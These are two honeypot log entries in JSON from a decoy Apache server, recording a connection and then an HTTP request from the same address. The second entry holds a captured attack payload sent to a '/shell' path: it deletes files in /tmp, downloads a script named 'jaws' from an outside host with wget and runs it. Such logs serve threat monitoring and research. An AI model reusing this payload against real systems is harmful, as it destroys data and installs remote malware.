{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-02-27T21:33:33.347828","parsedMessage":{"timestamp":"2023-02-27 21:33:33.347828","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 113.0.111.22:57430 to port 80","ip":"113.0.111.22"},"id":"29bf0f15-e9dd-4a3f-8ef6-85354f8e036a","EventProcessedUtcTime":"2023-02-27T21:33:33.8649956Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-02-27T21:33:33.6480000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/113.0.111.22"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Mon Feb 27 21:34:01 UTC 2023","parsedMessage":{"timestamp":"2023-02-27 21:33:33+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"113.0.111.22 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+update.rawupdater.cf/jaws;sh+/tmp/jaws HTTP/1.1\" 404 0 \"-\" \"Hello, world\"","ip":"113.0.111.22"},"id":"334da5ca-5e16-46c2-8845-7ced5fb5ad97","EventProcessedUtcTime":"2023-02-27T21:34:01.6462717Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-02-27T21:34:01.4960000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/113.0.111.22"}